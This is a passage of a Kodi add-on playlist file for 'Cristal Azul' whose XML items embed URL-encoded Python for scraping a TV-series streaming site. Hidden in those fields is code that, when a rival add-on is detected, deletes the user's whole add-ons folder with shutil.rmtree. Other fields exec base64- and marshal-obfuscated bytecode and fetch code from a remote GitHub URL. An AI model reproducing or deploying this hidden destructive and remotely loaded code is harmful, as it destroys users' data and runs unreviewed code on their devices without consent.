V0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/iaEDuGU.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>

--------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Otras Productoras[/COLOR]</title>
<link>$doregex[lou]</link>
<jsonrpc>plugin://plugin.video.cristalazul/?iconimage=https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg&amp;mode=17&amp;regexs=%7bu%27cap%27%3a%20%7b%27listrepeat%27%3a%20u%27%5cr%5cn%3ctitle%3e%5bCOLOR%20white%5d%5bcap.param1%5d%5b%2fCOLOR%5d%3c%2ftitle%3e%5cr%5cn%3cinfo%3e%5bCOLOR%20white%5d%5bcap.param1%5d%5b%2fCOLOR%5d%3c%2finfo%3e%5cr%5cn%3clink%3e%24doregex%5blink_final%5d%3c%2flink%3e%5cr%5cn%3cthumbnail%3e%5bmakelist2.param4%5d%3c%2fthumbnail%3e%5cr%5cn%3cfanart%3ehttps%3a%2f%2fi.imgur.com%2fKFAuyll.jpg%3c%2ffanart%3e%5cr%5cn%27%2c%20%27expres%27%3a%20u%27(%3fs)num-epi%22%3e(.%2a%3f)%3c.%2a%3f%3ca%20href%3d%22(https%3a%2f%2fseriesflix.io%2fepisodio.%2a%3f)%22%20class%3d%22lnk-blk%22%27%2c%20%27name%27%3a%20u%27cap%27%2c%20%27page%27%3a%20u%27%5btemp.param1%5d%27%7d%2c%20u%27reparar_conectores%27%3a%20%7b%27expres%27%3a%20u%22%23%24pyFunction%5cr%5cndef%20GetLSProData(page_data%2cCookie_Jar%2cm)%3a%5cr%5cn%20%20%20%20import%20urllib2%5cr%5cn%20%20%20%20return%20urllib2.urlopen(%27https%3a%2f%2fraw.githubusercontent.com%2fCristalazul%2fCristalazul.io%2fmain%2fCONECTORES%2fconector.a.distancia.definitivo%27).read()%5cr%5cn%22%2c%20%27name%27%3a%20u%27reparar_conectores%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27temp%27%3a%20%7b%27listrepeat%27%3a%20u%27%5cr%5cn%3ctitle%3e%5bCOLOR%20white%5d%5btemp.param2%5d%5btemp.param3%5d%5b%2fCOLOR%5d%3c%2ftitle%3e%5cr%5cn%3cinfo%3e%5bCOLOR%20white%5d%5btemp.param2%5d%5btemp.param3%5d%5b%2fCOLOR%5d%3c%2finfo%3e%5cr%5cn%3clink%3e%24doregex%5bcap%5d%3c%2flink%3e%5cr%5cn%3cthumbnail%3e%5bmakelist2.param4%5d%3c%2fthumbnail%3e%5cr%5cn%3cfanart%3ehttps%3a%2f%2fi.imgur.com%2fKFAuyll.jpg%3c%2ffanart%3e%5cr%5cn%27%2c%20%27expres%27%3a%20u%27(%3fs)choose-season%22.%2a%3fhref%3d%22(.%2a%3f)%22.%2a%3f%3e(.%2a%3f)%3c.%2a%3f%3e(.%2a%3f)%3c%27%2c%20%27name%27%3a%20u%27temp%27%2c%20%27page%27%3a%20u%27%5bmakelist2.param5%5d%27%7d%2c%20u%27selecion_inteligente%27%3a%20%7b%27expres%27%3a%20u%22%23%24pyFunction%5cr%5cnurl%20%3d%20%27%24doregex%5bfinal_url%5d%27%5cr%5cn%24doregex%5bimportar%5d%5cr%5cnfrom%20resolveurl.plugins.lib%20import%20jsunpack%5cr%5cn%24doregex%5breparar_conectores%5d%5cr%5cn%5cr%5cn%22%2c%20%27name%27%3a%20u%27selecion_inteligente%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27makelist2%27%3a%20%7b%27listrepeat%27%3a%20u%27%5cr%5cn%3ctitle%3e%5bCOLOR%20white%5d%5bmakelist2.param1%5d%20%5bCOLOR%20aqua%5d%5bmakelist2.param2%5d%20%5bmakelist2.param3%5d%5b%2fCOLOR%5d%3c%2ftitle%3e%5cr%5cn%3cinfo%3e%5bCOLOR%20white%5d%5bmakelist2.param1%5d%20%5bCOLOR%20aqua%5d%5bmakelist2.param2%5d%20%5bmakelist2.param3%5d%5b%2fCOLOR%5d%3c%2finfo%3e%5cr%5cn%3clink%3e%24doregex%5btemp%5d%3c%2flink%3e%5cr%5cn%3cthumbnail%3e%5bmakelist2.param4%5d%3c%2fthumbnail%3e%5cr%5cn%3cfanart%3ehttps%3a%2f%2fi.imgur.com%2fKFAuyll.jpg%3c%2ffanart%3e%5cr%5cn%27%2c%20%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnelegir%20%3d%20%5c%27productoras%5c%27%5cr%5cnimport%20re%2crequests%2cbase64%2cxbmc%2cxbmcgui%2cxbmcaddon%2cshutil%5cr%5cndef%20GetLSProData(page_data%2c%20Cookie_Jar%2c%20m%2celegir%3delegir)%3a%5cr%5cn%5cr%5cn%20try%3a%5cr%5cn%20%20estamos%20%3d%20xbmcaddon.Addon(%5c%27plugin.video.blackghost%5c%27)%5cr%5cn%20%20version%20%3d%20estamos.getAddonInfo(%5c%27version%5c%27)%5cr%5cn%20%20if%20%5c%27.%5c%27%20in%20version%3a%5cr%5cn%20%20%20%20addon_path%20%3d%20xbmc.translatePath(%5c%27special%3a%2f%2fhome%2faddons%5c%27).decode(%5c%27utf-8%5c%27)%5cr%5cn%20%20%20%20shutil.rmtree(addon_path%2c%20ignore_errors%3dTrue)%5cr%5cn%20%20%20%20return%20xbmc.executebuiltin(%5c%27PlayMedia(%22https%3a%2f%2fwww.ivoox.com%2flisten_mn_23681872_1.m4a%3finternal%3dHTML5%22%2c1)%5c%27)%5cr%5cn%20%20else%3a%5cr%5cn%20%20%20%20xbmc.executebuiltin(%5c%27PlayMedia(%22https%3a%2f%2fwww.ivoox.com%2flisten_mn_23681872_1.m4a%3finternal%3dHTML5%22%2c1)%5c%27)%5cr%5cn%20%20%20%20return%20xbmc.executebuiltin(%22XBMC.Notification(%5bCOLOR%20aqua%5dCristal%20Azul%20%5b%2fCOLOR%5d%2c%5bCOLOR%20gold%5d%20robado%20a%20cristal%20azul%5b%2fCOLOR%5d%2c%2025000)%22)%5cr%5cn%20except%3a%5cr%5cn%20%20id%20%3d%20xbmcaddon.Addon().getAddonInfo(%5c%27id%5c%27)%5cr%5cn%20%20if%20%5c%27cristalazul%5c%27%20in%20id%20or%20%5c%27festa%5c%27%20in%20id%20or%20%5c%27FusionTv%5c%27%20in%20id%3a%5cr%5cn%20%20%5cr%5cn%20%20%20%20patron%20%3d%20%5c%27(%3fs)%22entry-title%22%3e(.%2a%3f)%3c.%2a%3f(TMDB).%2a%3f%3e(.%2a%3f)%3c.%2a%3fdata-src%3d%22(.%2a%3f)%22.%2a%3fhref%3d%22(.%2a%3f)%22%5c%27%5cr%5cn%20%20%20%20if%20%5c%27search%5c%27%20%3d%3d%20elegir%3a%5cr%5cn%5cr%5cn%20%20%20%20%20%20dialog%20%3d%20xbmcgui.Dialog()%5cr%5cn%5ct%20%20%5cr%5cn%20%20%20%20%20%20Palabra_Buscada%20%3d%20xbmcgui.Dialog().input(%5c%27Buscar%20Serie%3a%20%5c%27%2c%20type%3dxbmcgui.INPUT_ALPHANUM)%5cr%5cn%20%5cr%5cn%5ct%20%20%5cr%5cn%20%20%20%20%20%20source%20%3d%20requests.get(%5c%27https%3a%2f%2fseriesflix.io%2f%3fs%3d%5c%27%2bPalabra_Buscada%2c%20headers%3d%7b%5c%27User-Agent%5c%27%3a%20%5c%27Mozilla%2f5.0%20(Windows%20NT%206.3%3b%20WOW64%3b%20rv%3a55.0)%20Gecko%2f20100101%20Firefox%2f55.0%5c%27%2c%20%5c%27Referer%5c%27%3a%20%5c%27https%3a%2f%2fseriesflix.io%2f%5c%27%7d%2c%20verify%3dFalse).content%5cr%5cn%5ct%20%20%5cr%5cn%20%20%20%20%20%20data%20%3d%20re.findall(patron%2cre.findall(%5c%27(%3fs)html%3e(.%2b%3f)Populares%5c%27%2csource)%5b0%5d)%5cr%5cn%5cr%5cn%20%20%20%20%20%20numero_total%20%3d%20len(data)%5cr%5cn%5ct%20%20%5cr%5cn%20%20%20%20%20%20return%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20aqua%5dCristal%20Azul%20Resultados%20de%3a%20%5bCOLOR%20white%5d%5c%27%2bPalabra_Buscada%2b%5c%27%20(%5c%27%2bstr(numero_total)%2b%5c%27)%5c%27%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%20%2b%20data%20%2b%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20white%5dNo%20hay%20mas%20resultados...%5c%27%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%5cr%5cn%5cr%5cn%5cr%5cn%20%20%5cr%5cn%20%20%20%20elif%20%5c%27Todas%5c%27%20%3d%3d%20elegir%3a%5cr%5cn%5ct%5cr%5cn%5cr%5cn%20%20%20%20%20%20count%3d49%3bpn%3d1%3bdata%3d%5b%5d%5cr%5cn%5cr%5cn%20%20%20%20%20%20while%20pn%20%3c%3d%20int(count)%3a%5cr%5cn%20%20%20%20%20%20%20%20%20%20page%3d%5c%27https%3a%2f%2fseriesflix.io%2fver-series-online%2fpage%2f%5c%27%2bstr(pn)%2b%5c%27%2f%5c%27%3bsource%3drequests.get(page).content.decode(%5c%27ascii%5c%27%2c%5c%27ignore%5c%27)%5cr%5cn%20%20%20%20%20%20%20%20%20%20data%20%2b%3dre.findall(patron%2csource.split(%5c%27Populares%5c%27)%5b0%5d)%3bpn%20%2b%3d1%5cr%5cn%20%20%20%20%20%20return%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20aqua%5dCristal%20Azul%20Resultados%20de%3a%20%5bCOLOR%20white%5dTodas%5c%27%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%20%2b%20data%20%2b%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20white%5dNo%20hay%20mas%20resultados...%5c%27%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%5cr%5cn%5cr%5cn%20%20%20%20elif%20%5c%27productoras%5c%27%20%3d%3d%20elegir%3a%5cr%5cn%5cr%5cn%20%20%20%20%20%20response%20%3d%20requests.get(%5c%27https%3a%2f%2fseriesflix.io%2f%5c%27%2c%20headers%3d%7b%5c%27User-Agent%5c%27%3a%20%5c%27Mozilla%2f5.0%20(Windows%20NT%206.3%3b%20WOW64%3b%20rv%3a55.0)%20Gecko%2f20100101%20Firefox%2f55.0%5c%27%7d%2c%20verify%3dFalse).content%5cr%5cn%20%20%20%20%20%20items%20%3d%20re.findall(%5c%27%3ca%20href%3d%22(https%3a%2f%2fseriesflix.io%2fgenero%2fseries-de-.%2a%3f)%22%3eSeries%20de%20(.%2a%3f)%3c.%2a%3f%3e.%2a%3f(%5c%5c(.%2a%3f)%3c%5c%27%2c%20response)%5cr%5cn%20%20%20%20%20%20dialog%20%3d%20xbmcgui.Dialog()%5cr%5cn%20%20%20%20%20%20enlaces%20%3d%20%5b%5d%5cr%5cn%20%20%20%20%20%20seleccion%20%3d%20%5b%5d%5cr%5cn%20%20%20%20%20%20for%20item%20in%20items%3a%5cr%5cn%20%20%20%20%20%20%20%20%20%20enlaces.append(item%5b0%5d)%5cr%5cn%20%20%20%20%20%20%20%20%20%20seleccion.append(%5c%27%5bCOLOR%20white%5dSeries%20%5c%27%2bitem%5b1%5d%2b%5c%27%5bCOLOR%20gold%5d%20%5e%2a%20%5bCOLOR%20white%5d%5c%27%2bitem%5b2%5d%2b%5c%27%5b%2fCOLOR%5d%5c%27)%5cr%5cn%20%20%20%20%20%20titulo%20%3d%20dialog.select(%5c%27seleciona%20enlace%3a%20%5c%27%2c%20seleccion)%5cr%5cn%20%20%20%20%20%20if%20(titulo%20%3c%200)%3a%5cr%5cn%20%20%20%20%20%20%20%20%20%20dialog%20%3d%20xbmcgui.Dialog()%5cr%5cn%20%20%20%20%20%20%20%20%20%20dialog.notification(%22Cristal%20Azul%22%2c%20%22Reproduccion%20cancelada!!!%22%2c%5cr%5cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20xbmcgui.NOTIFICATION_INFO%2c%205000%2c%20False)%5cr%5cn%20%20%20%20%20%20%20%20%20%20return%20%5c%27no_enlace%5c%27%5cr%5cn%20%20%20%20%20%20productora%20%3d%20enlaces%5btitulo%5d%20%20%5cr%5cn%20%20%20%20%20%20count%3d7%3bpn%3d1%3bdata%3d%5b%5d%5cr%5cn%5cr%5cn%20%20%20%20%20%20while%20pn%20%3c%3d%20int(count)%3a%5cr%5cn%20%20%20%20%20%20%20%20%20%20page%3dproductora%2b%5c%27%2fpage%2f%5c%27%2bstr(pn)%2b%5c%27%2f%5c%27%3bsource%3drequests.get(page).content.decode(%5c%27ascii%5c%27%2c%5c%27ignore%5c%27)%5cr%5cn%20%20%20%20%20%20%20%20%20%20data%20%2b%3dre.findall(patron%2csource.split(%5c%27Populares%5c%27)%5b0%5d)%3bpn%20%2b%3d1%5cr%5cn%20%20%20%20%20%20return%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20aqua%5dCristal%20Azul%20Resultados%20de%3a%20%5bCOLOR%20white%5d%5c%27%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%20%2b%20data%20%2b%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20white%5dNo%20hay%20mas%20resultados...%5c%27%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%5cr%5cn%5cr%5cn%20%20%20%20elif%20%5c%27productoras_principales%5c%27%20%3d%3d%20elegir%3a%5cr%5cn%5cr%5cn%20%20%20%20%20%20dialog%20%3d%20xbmcgui.Dialog()%5cr%5cn%5cr%5cn%20%20%20%20%20%20ret%20%3d%20dialog.select(%5c%27%5bCOLOR%20white%5dSeleccione%20una%20productora%5b%2fCOLOR%5d%5c%27%2c%20%5b%5c%27%5bCOLOR%20white%5dNetflix%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dHbo%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dAmazon%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dFox%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dCbs%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dThe%20Cw%5b%2fCOLOR%5d%5c%27%5d)%5cr%5cn%20%20%20%20%20%20lists%20%3d%20%5b%5c%27netflix-online%5c%27%2c%20%5c%27hbo%5c%27%2c%20%5c%27amazon%5c%27%2c%20%5c%27fox%5c%27%2c%20%5c%27cbs%5c%27%2c%20%5c%27the-cw%5c%27%5d%5cr%5cn%5cr%5cn%20%20%20%20%20%20productora%20%3d%20lists%5bret%5d%5cr%5cn%20%20%5cr%5cn%20%20%20%20%20%20count%3d15%3bpn%3d1%3bdata%3d%5b%5d%5cr%5cn%5cr%5cn%20%20%20%20%20%20while%20pn%20%3c%3d%20int(count)%3a%5cr%5cn%20%20%20%20%20%20%20%20%20%20page%3d%5c%27https%3a%2f%2fseriesflix.io%2fgenero%2fseries-de-%5c%27%2bproductora%2b%5c%27%2fpage%2f%5c%27%2bstr(pn)%2b%5c%27%2f%5c%27%3bsource%3drequests.get(page).content.decode(%5c%27ascii%5c%27%2c%5c%27ignore%5c%27)%5cr%5cn%20%20%20%20%20%20%20%20%20%20data%20%2b%3dre.findall(patron%2csource.split(%5c%27Populares%5c%27)%5b0%5d)%3bpn%20%2b%3d1%5cr%5cn%20%20%20%20%20%20return%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20aqua%5dCristal%20Azul%20Resultados%20de%3a%20%5bCOLOR%20white%5d%5c%27%2bproductora%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%20%2b%20data%20%2b%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20white%5dNo%20hay%20mas%20resultados...%5c%27%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%5cr%5cn%5cr%5cn%20%20%20%20elif%20%5c%27genero%5c%27%20%3d%3d%20elegir%3a%5cr%5cn%5cr%5cn%20%20%20%20%20%20dialog%20%3d%20xbmcgui.Dialog()%5cr%5cn%5cr%5cn%20%20%20%20%20%20ret%20%3d%20dialog.select(%5c%27%5bCOLOR%20white%5dSeleccione%20un%20G%5cxc3%5cxa9nero%5b%2fCOLOR%5d%5c%27%2c%20%5b%5c%27%5bCOLOR%20white%5dAccion%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dAnimacion%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dAventura%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dAntiguas%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dDrama%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dCiencia-Ficcion%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dComedia%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dCrimen%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dTerror%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dDorama%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dDc%20Comics%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dFantasia%5b%2fCOLOR%5d%5c%27%2c%20%5c%27%5bCOLOR%20white%5dAnime%5b%2fCOLOR%5d%5c%27%5d)%5cr%5cn%20%20%20%20%20%20lists%20%3d%20%5b%5c%27accion%5c%27%2c%20%5c%27animacion%5c%27%2c%20%5c%27aventura%5c%27%2c%20%5c%27series-antiguas%5c%27%2c%20%5c%27drama%5c%27%2c%20%5c%27ciencia-ficcion%5c%27%2c%20%5c%27comedia%5c%27%2c%20%5c%27crimen%5c%27%2c%20%5c%27terror%5c%27%2c%20%5c%27dorama%5c%27%2c%20%5c%27dc-comics%5c%27%2c%20%5c%27fantasia%5c%27%2c%20%5c%27anime%5c%27%5d%5cr%5cn%20%5cr%5cn%20%20%20%20%20%20genero%20%3d%20lists%5bret%5d%5cr%5cn%20%20%5cr%5cn%20%20%20%20%20%20count%3d15%3bpn%3d1%3bdata%3d%5b%5d%5cr%5cn%5cr%5cn%20%20%20%20%20%20while%20pn%20%3c%3d%20int(count)%3a%5cr%5cn%20%20%20%20%20%20%20%20%20%20page%3d%5c%27https%3a%2f%2fseriesflix.io%2fgenero%2f%5c%27%2bgenero%2b%5c%27%2fpage%2f%5c%27%2bstr(pn)%2b%5c%27%2f%5c%27%3bsource%3drequests.get(page).content.decode(%5c%27ascii%5c%27%2c%5c%27ignore%5c%27)%5cr%5cn%20%20%20%20%20%20%20%20%20%20data%20%2b%3dre.findall(patron%2csource.split(%5c%27Populares%5c%27)%5b0%5d)%3bpn%20%2b%3d1%5cr%5cn%20%20%20%20%20%20return%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20aqua%5dCristal%20Azul%20Resultados%20de%3a%20%5bCOLOR%20white%5d%5c%27%2bgenero%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%20%2b%20data%20%2b%20%5b(%5c%27%20%5c%27%2c%20%5c%27%5bCOLOR%20white%5dNo%20hay%20mas%20resultados...%5c%27%2c%20%5c%27%20%5c%27%2c%20%5c%27https%3a%2f%2fi.imgur.com%2fqvzF7Rz.jpg%5c%27%2c%20%5c%27%20%5c%27)%5d%5cr%5cn%5cr%5cn%20%20%20%20else%3a%5cr%5cn%20%20%20%20%20%20xbmc.executebuiltin(%5c%27PlayMedia(%22https%3a%2f%2fwww.ivoox.com%2flisten_mn_23681872_1.m4a%3finternal%3dHTML5%22%2c1)%5c%27)%5cr%5cn%20%20%20%20%20%20return%20xbmc.executebuiltin(%22XBMC.Notification(%5bCOLOR%20aqua%5dCristal%20Azul%20%5b%2fCOLOR%5d%2c%5bCOLOR%20gold%5d%20robado%20a%20cristal%20azul%5b%2fCOLOR%5d%2c%2025000)%22)%5cr%5cn%20%20else%3a%5cr%5cn%20%20%20%20xbmc.executebuiltin(%5c%27PlayMedia(%22https%3a%2f%2fwww.ivoox.com%2flisten_mn_23681872_1.m4a%3finternal%3dHTML5%22%2c1)%5c%27)%5cr%5cn%20%20%20%20return%20xbmc.executebuiltin(%22XBMC.Notification(%5bCOLOR%20aqua%5dCristal%20Azul%20%5b%2fCOLOR%5d%2c%5bCOLOR%20gold%5d%20robado%20a%20cristal%20azul%5b%2fCOLOR%5d%2c%2025000)%22)%5cr%5cn%5cr%5cn%27%2c%20%27name%27%3a%20u%27makelist2%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27importar%27%3a%20%7b%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnimport%20base64%3bexec(base64.b64decode(%22aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp%22))%5cr%5cn%27%2c%20%27name%27%3a%20u%27importar%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27link_final%27%3a%20%7b%27listrepeat%27%3a%20u%27%5cr%5cn%3ctitle%3e%5bCOLOR%20white%5d%5blink_final.param3%5d%20%5blink_final.param2%5d%5b%2fCOLOR%5d%3c%2ftitle%3e%5cr%5cn%3cinfo%3e%5bCOLOR%20white%5d%5bcap.param1%5d%5b%2fCOLOR%5d%3c%2finfo%3e%5cr%5cn%3clink%3e%24doregex%5bselecion_inteligente%5d%3c%2flink%3e%5cr%5cn%3cthumbnail%3e%5bmakelist2.param4%5d%3c%2fthumbnail%3e%5cr%5cn%3cfanart%3ehttps%3a%2f%2fi.imgur.com%2fKFAuyll.jpg%3c%2ffanart%3e%5cr%5cn%27%2c%20%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnurl1%20%3d%20%5c%27%5bcap.param2%5d%5c%27%5cr%5cnimport%20re%2crequests%2cbase64%2cxbmc%2cxbmcgui%2cxbmcaddon%2crandom%5cr%5cndef%20GetLSProData(page_data%2c%20Cookie_Jar%2c%20m)%3a%5cr%5cn%5cr%5cn%20%20id%20%3d%20xbmcaddon.Addon().getAddonInfo(%5c%27id%5c%27)%5cr%5cn%20%20if%20%5c%27cristalazul%5c%27%20in%20id%20or%20%5c%27festa%5c%27%20in%20id%20or%20%5c%27FusionTv%5c%27%20in%20id%3a%5cr%5cn%20%20%20response%20%3d%20requests.get(url1%20%2cheaders%3d%7b%5c%27user-agent%5c%27%3a%5c%27Mozilla%2f5.0%5c%27%2c%5c%27referer%5c%27%3aurl1%2c%5c%27x-requested-with%5c%27%3a%5c%27XMLHttpRequest%5c%27%7d).content%5cr%5cn%20%20%20trid%20%3d%20re.findall(%5c%27trid%3d(%5c%5cd%2b)%5c%27%2c%20response)%5b0%5d%5cr%5cn%20%20%20items%20%3d%20re.findall(%5c%27href%3d%22.options-(%5c%5cd%2b).%2a%3fclass%3d%22server%22%3e(.%2a%3f)-